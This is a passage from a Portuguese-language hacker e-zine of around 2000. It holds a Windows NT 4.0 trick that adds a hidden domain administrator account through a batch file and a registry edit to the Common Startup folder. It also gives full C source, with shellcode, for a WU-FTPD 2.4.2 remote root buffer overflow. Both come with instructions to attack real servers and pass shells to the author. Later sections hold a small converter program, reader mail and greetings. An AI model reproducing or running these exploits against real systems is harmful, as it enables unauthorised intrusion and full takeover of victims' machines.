ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ



ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
³      Explorando O Problema Do Folder Dos Usuarios No Windows Nt 4.0        ³
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
³Eh... eu vou diretamente falando oque fazer.                                ³
³                                                                            ³
³                                                                            ³
³1                                                                           ³
³ Crie um arquivo batch (c:\hacked) contendo os seguintes comandos:          ³
³                                                                            ³
³--------------------inicio--------------------                              ³
³                                                                            ³
³net user adm1n /add /domain                                                 ³
³net group administrators adm1n /add /domain                                 ³
³                                                                            ³
³---------------------fim----------------------                              ³
³                                                                            ³
³2                                                                           ³
³ Altere o registro                                                          ³
³HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\      ³
³User Shell Folders\Common Startup                                           ³
³                                                                            ³
³(entre pelo regedit, e va encontrando estas pastas no lado direito. ateh    ³
³  chegar a Common Startup e poder mudar o valor. Para modificar o valor,    ³
³  simplesmente clique com o botao direito e vah em modificar.)              ³
³                                                                            ³
³Coloque "c:\hacked" como valor.                                             ³
³                                                                            ³
³                                                                            ³
³3) Aguarde um administrador logar e obtenha acesso administrativo na maquina³
³atraves da recem-criada conta "adm1n" que voce deve ter notado acima.       ³
³                                                                            ³
³E tcharam!                                                                  ³
³                                                                            ³
³Seja feliz.                                                                 ³
³                                                                            ³
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
                                         ³
                                         ³
                                         À http://www.s13.org  -  s13@s13.org
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~   19 - Hackeando daemon   ~YXXXXx_
  _xXXXXXX(            de ftp             )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_         Slash-DOMI        _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~


Introdução

Vamos aprender a hackear graças a um buffer overfolow no servidor de ftp
WU-2.4.2-ACADEM[BETA-18] (um dos mais encontrados).
Vc pode logar usando a opção de anonymous em um diretório com permissão de 
escrita (+W) e cata um root com um overflow.

Encontrando servers

Bom, vc procura servidores com a porta de ftp ativa (21), dae da um 
ftp.servidor.com.
Vai aparecer o nome do servidor, se for WU 2.4.2 eh paulada, facinhu de 
hacka, se for otro tb eh facinhu (dependendo), mas vc num quer tudo de mão 
bejada neh?
OK, testa a conta anonymous, se funcionar provavelmente vc vai cair no 
diretorio /pub, massa!
Vamu hacka!

O Exploit

Bom, esse eh um exploit da ADM, eu coloquei ele pq eh de um bug muito 
encontrado i eh facinhu de usa. :)

<++> xploits/wu.c

/*      Inicio do wu.c
 
	THIS IS PRIVATE! DO NOT DISTRIBUTE!!!!   PRIVATE!

	WU-FTPD REMOTE EXPLOIT Version wu-2.4.2-academ[BETA-18](1)
	for linux x86 (redhat 5.2)

	by duke
	duke@viper.net.au

	BIG thanks to stran9er for alot of help with part of the shellcode!
	i fear stran9er, but who doesn't? !@$ :)

	Greets to: #!ADM, el8.org users,  
	
	To exploit this remotely they need to have a directory you can
	have write privlidges to.. this is the <dir> argument.. you can
	also use this locally by specifying -l <ur login> <urpass> with the
	<dir> = your home directory or something
	-duke
*/

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/select.h>

#define RET 0xbfffa80f 

void logintoftp();
void sh();
void mkd(char *);
int max(int, int);

char shellcode[] =
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\xb0\x17\xcd\x80"
"\x31\xc0\x31\xdb\xb0\x2e\xcd\x80"
"\xeb\x4f\x31\xc0\x31\xc9\x5e\xb0\x27\x8d\x5e\x05\xfe\xc5\xb1\xed"
"\xcd\x80\x31\xc0\x8d\x5e\x05\xb0\x3d\xcd\x80\x31\xc0\xbb\xd2\xd1"
"\xd0\xff\xf7\xdb\x31\xc9\xb1\x10\x56\x01\xce\x89\x1e\x83\xc6\x03"
"\xe0\xf9\x5e\xb0\x3d\x8d\x5e\x10\xcd\x80\x31\xc0\x88\x46\x07\x89"
"\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd"
"\x80\xe8\xac\xff\xff\xff";

char tmp[256];
char name[128], pass[128];

int sockfd;

int main(int argc, char **argv)
{
	char sendln[1024], recvln[4048], buf1[800], buf2[1000];
	char *p, *q;
	int len, offset = 0, i;
	struct sockaddr_in cli;

	if(argc < 3){
		printf("usage: %s <host> <dir> [-l name pass] [offset]\n", argv[0]);
		exit(0);
	}
	if(argc >= 4){
		if(strcmp(argv[3], "-l") == 0){
			strncpy(name, argv[4], 128);
			strncpy(pass, argv[5], 128);
		} else {
			offset = atoi(argv[3]);
		}
		if(argc == 7)
			offset = atoi(argv[6]);
	}
		
	if(name[0] == 0 && pass[0] == 0){ 
		strcpy(name, "anonymous");
		strcpy(pass, "hi@blahblah.net");
	}

	bzero(&cli, sizeof(cli));
	bzero(recvln, sizeof(recvln));
	bzero(sendln, sizeof(sendln));
	cli.sin_family = AF_INET;
	cli.sin_port = htons(21);
	inet_pton(AF_INET, argv[1], &cli.sin_addr);

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		exit(0);
	}
	
	if(connect(sockfd, (struct sockaddr *)&cli, sizeof(cli)) < 0){
		perror("connect");
		exit(0);
	}
	while((len = read(sockfd, recvln, sizeof(recvln))) > 0){
		recvln[len] = '\0';
		if(strchr(recvln, '\n') != NULL)
			break;
	}
	logintoftp(sockfd); 
	printf("logged in.\n");
	bzero(sendln, sizeof(sendln));

	for(i=0; i<996; i+=4)
		*(long *)&buf2[i] = RET + offset;
	memset(buf1, 0x90, 800);
	memcpy(buf1, argv[2], strlen(argv[2]));
	mkd(argv[2]);
	p = &buf1[strlen(argv[2])];
	q = &buf1[799];
	*q = '\x0';
	while(p <= q){
		strncpy(tmp, p, 200);
		mkd(tmp);
		p+=200;
	}
	mkd(shellcode);
	mkd("bin");
	mkd("sh");
	p = &buf2[0];
	q = &buf2[999];
	while(p <= q){
		strncpy(tmp, p, 250);
		mkd(tmp);
		p+=250;
	}
	sh(sockfd);


	close(sockfd);
	printf("finit.\n");
}

void mkd(char *dir)
{
	char snd[512], rcv[1024];
	char blah[1024], *p;
	int n;
	
	bzero(blah, sizeof(blah));
	p = blah;
	 for(n=0; n<strlen(dir); n++){
		if(dir[n] == '\xff'){
			*p = '\xff';
			p++;
		}
		*p = dir[n];
		p++;
	} 	
	sprintf(snd, "MKD %s\r\n", blah);
	write(sockfd, snd, strlen(snd));
	bzero(snd, sizeof(snd));
	sprintf(snd, "CWD %s\r\n", blah);
	write(sockfd, snd, strlen(snd));
	bzero(rcv, sizeof(rcv));
	while((n = read(sockfd, rcv, sizeof(rcv))) > 0){
		rcv[n] = 0;
		if(strchr(rcv, '\n') != NULL)
			break;
	}
	return;
}

void logintoftp()
{
	char snd[1024], rcv[1024];
	int n;

	printf("logging in with %s: %s\n", name, pass);
 	memset(snd, '\0', 1024);
	sprintf(snd, "USER %s\r\n", name);
	write(sockfd, snd, strlen(snd));

        while((n=read(sockfd, rcv, sizeof(rcv))) > 0){
                rcv[n] = 0;
                if(strchr(rcv, '\n') != NULL)
                        break;
        }

	memset(snd, '\0', 1024);
        sprintf(snd, "PASS %s\r\n", pass);
        write(sockfd, snd, strlen(snd));

	while((n=read(sockfd, rcv, sizeof(rcv))) > 0){
		rcv[n] = 0;
		if(strchr(rcv, '\n') != NULL)
			break;
	}
	return;
}

void sh()
{
	char snd[1024], rcv[1024];
	fd_set rset;
	int maxfd, n;

	strcpy(snd, "cd /; uname -a; pwd; id;\n");
	write(sockfd, snd, strlen(snd));

	for(;;){
		FD_SET(fileno(stdin), &rset);
                FD_SET(sockfd, &rset);
                maxfd = max(fileno(stdin), sockfd) + 1;
                select(maxfd, &rset, NULL, NULL, NULL);
                if(FD_ISSET(fileno(stdin), &rset)){
                        bzero(snd, sizeof(snd));
                        fgets(snd, sizeof(snd)-2, stdin);
                        write(sockfd, snd, strlen(snd));
                }
                if(FD_ISSET(sockfd, &rset)){
                        bzero(rcv, sizeof(rcv));
                        if((n = read(sockfd, rcv, sizeof(rcv))) == 0){
                                printf("EOF.\n");
                                exit(0);
                        }
		        if(n < 0){
                                perror("read");
                                exit(-1);
                        }
                        fputs(rcv, stdout);
                }
        }
}

int max(int x, int y)
{
        if(x > y)
                return(x);
        return(y);
}



<-->

Exploiting

OK, temos o server vulneravel e o exploit, vamos pegar um root.
Eh so vc seguir esses passos:
cc -o wu wu.c
./wuservidor /pub -l anonymous script@kidah.com

Dae vc cai numa shell root, facinho neh?
Bom, acho que eh isso, vai no Altavista e cata uma duzia de servidores .com
vulneraveis, hacka gringo rlz!
Dae c vc quiser manda uma shell pra eu, beleza....
hehehehe

Echo Off
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~      20 - Convertedor     ~YXXXXx_
  _xXXXXXX(           ASCII-HEXA          )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



   Aki vai mais um programa supremo codeado por mestre struck.
   Em cada edicao da f3 vou colocar um programa assim tao hacker qto esse
e a calculadora de vezes que saiu com a f3-00 para vcs fikarem a cada
edicao mais hackers do que ja eram... =P
   Vamos ao super programa....


<++> Superprogs/convert.c
// Convertedor Hexa-Ascii
// by Cheat Struck <cszine@xoommail.com>
//
// Como usar???
//  [root@localhost myprgs]# ./a.out
//  Ascii : A
//  Hexa  : 41
//  [root@localhost myprgs]# ./a.out -h
//  Hexa  : 41
//  Ascii : A
//  [root@localhost myprgs]#
//
//

main(int argc, char *argv[]) {
   int d;

   d = getopt(argc,argv,"h");
   if(d == 'h') {
     printf("Hexa  : ");

// Essa funcao foi rippada do programa elito HEX2ASCII by hak.
     scanf ("%x",&d);

     printf("Ascii : %c\n",d);
   } else {
     printf("Ascii : ");
     d = getchar();
     printf("Hexa  : %x\n",d);
   }

}

//EoF
<-->
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~        21 - Emails        ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~


  
Date: Sun, 23 Apr 2000 22:14:42 -0300  
From: warlock <?????????????????????>  
Subject: Sua zine  
 

Eai k ra, blz?

Rpz seu zine ta rlz mermo, pa kem fez sozin, li o seu history, e pode saber ki 
o a fama do titanic vai acabar, hehehehe.

Minha historia numeh muito diferente da sua, sendo que eu nao sei tanto kuanto 
vc, e por isso resolvi escrever esse mail, acho ki cmo foi ou eh com vc, estou 
em constante busca de info, td, c, bugs, td mermo, e kiria aprender um pouco 
com vc, e se vc pudesse me desse umas dicas, cmo alguns livros, alguns zines, 
alguns k ras rlz do irc, e talz, tipo, cheguei ateh a ter acesso a um k nal de 
vcs, era o #fatal, o sn4p ki me passo a senha de la, mas o k ra somiu e num 
apareceu mais, assim cmo o k nal tb, entao eh isso ae, po saber ki seu zine ta 
rlz mermo, e ki suas matehrias sao rlz, num so puxasaco nao, se for botar esse 
mail no zine, num coloca meu adress nao, falo?

fuiz

-------------

   Opa! Nao eh novidade sua historia ser semelhante a minha ja que a maioria
q leu akele texto comecou assim. Por issu nao c sinta diferente. =)
   Tipo... info c vai encontra na zine de montao, agora aulas particulares...
nem rola...
   bah.. tipo essa historia do #fatal rolou pq a principio fatal 3rror seria
um grupo q eu e o sn4p iamos fundar, mas ele deu uma sumida e nao rolou nada,
no fim acabei por aproveitar o nome para a zine.
   issu ae!


==================
==================
==================


Date: Mon, 15 May 2000 01:52:19 -0300  
From: ZiWager <?????????????????????>  
Subject: Ae Cheat Struck!


Falae guri!
Li tua zine rapaz e curti. Espero que vc continue mantendo ela no ar.
Se precisar de um help pode conta cumigo.
[]'s!!!

-------------

   Aeeeeeeeeeee!
   Valew por tudo! 
   Tipo... Nao mandem emails apenas pra puchar o sako da zine. Podem falar mau
tbm que ae eu tento melhorar na proxima edicao.
   Mas nao importa o que achou da zine, nao deixe de mandar emails.
    



   Sux! Depois dissu deu pau no redirecionador e nao consegui receber nenhum
outro email. A partir de agora mandem para:


       cszine@xoommail.com


   ou entao para:


       bulebule@hotmail.com


   C voce mandou um email e ele nao apareceu aki ou eu nao dei reply eh porque
ele nao chegou ateh minha mailbox. Provavelmente travou no redirecionador 
(@struck.8m.com) entao reenvie-o por favor.
   Tipo... Eu nao vou fika emplorando para voces enviarem mails pq iria parecer
que to desesperado. Mas eu curto receber criticas sobre o que eu escrevo e 
acho muito legal ter a mailbox cheia de msgs de leitores da zine entao nao
pense 2x e vai agora enviar qqer coisa pra mim.
   Alegre minha noite com seu emaiu. Alem do que vc vai ter seu minuto de fama
qdo ele for publicado aki. =) C nao tiver afim de q seja publicado eh soh 
pidir. Issu eh tudo. Falow!
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~       22 - Th3 End        ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



   Finalmente acabou essa porquera toda!!!

   Como prometido, foi mantido o nivel na zine, e alguns editores ja
comecaram a ajudar. C voce ta afim de ajudar tambem, pode comecar colo-
cando links para struck.8m.com/f3 ou distribuindo-a na sua page.

   Mas c vc tiver afim de escrever pra zine, antes de comecar a teclar
feito doido mande um email pra cszine@xoommail.com dizendo o assunto e
os topicos que serao tratados no texto. Eu nao vo sair publicando qquer
merda que me mandarem.

   Eu tava com problemas com o redirecionador e soh fui descobrir agora
faltando algumas semanas pro lancamento. Entao c tiver afim de xingar, 
elogiar ou apenas encher meu sako, pode manda emaius que todos serao 
lidos.

   O emeiu agora eh: cszine@xoommail.com

   Relembrando: cszine@xoommail.com

   Bah! Mandem emails porra! Acho que ate' o lancamento desta edicao o
publico da zine ainda eh pequeno pois chegaram muitos poucos emails. 

   C ateh a proxima edicao nao vier retorno issu vai acabar. To falando
serio! Nao riam! Eu nao vo voltar a escrever zine nenhuma! PORRA! PAREM
DE RIR!!!!!!!! VAO C FUDER!!!

   Gr33tz to:
(por ordem alfabetica pra nao ter briga)
Billie           Critico de filme porno.
Cacaio           Adolescente problematico drogado e roqueiro.
Cliptor          Lider espiritual.
Dave Mustaine    Alcoolatra anonimo renomado.
Eletronic        Trombadinha de aglomeracoes.
Encripty         Chefe do partido comunista pro-desordem.
MaskMaster       Chefe das Forcas Armadas para Libertacao do Burundistao do Sul.
OVER DEATH       Chefe do departamento de turismo na maionese.
pcmcia           Chefe dos pes descalcos (q comprou uma bota de R$90!)
phrog            Reencarnacao de Jo'.
Thasmx           Colecionador (de mp3) q costuma falar sozinhu nos knais.
sk               Elito sem rumo.
Slash-DOMI       Hacker sem maldade.
Spike            Vagabundo sem vergonha.
Tinker Train     Programador sem terra.
TPGA             Phreaker sem telefone.


   Se faltou alguem, me agradece depois. =)

   Hmmm... Lembrando. A pedido do cliptor vo faze uma propaganda pra zine dele
aki tambem... www.s13.org. Confiram. Ja esta na 4a edicao. Ah!!! Eu me contive 
o maximo q pude mas vo ter que falar issu. Nao tem como evitar de disconfiar q
a maioria dos emails publicados la foram inventados por ele. =)
   Mas tudo bem, assim ele faz tipo um FAQ disfarcado. 
   Cliptor: []'sss. 

   Por hoje chega!!! Xau pra todos!!!

   This is EoF!!!
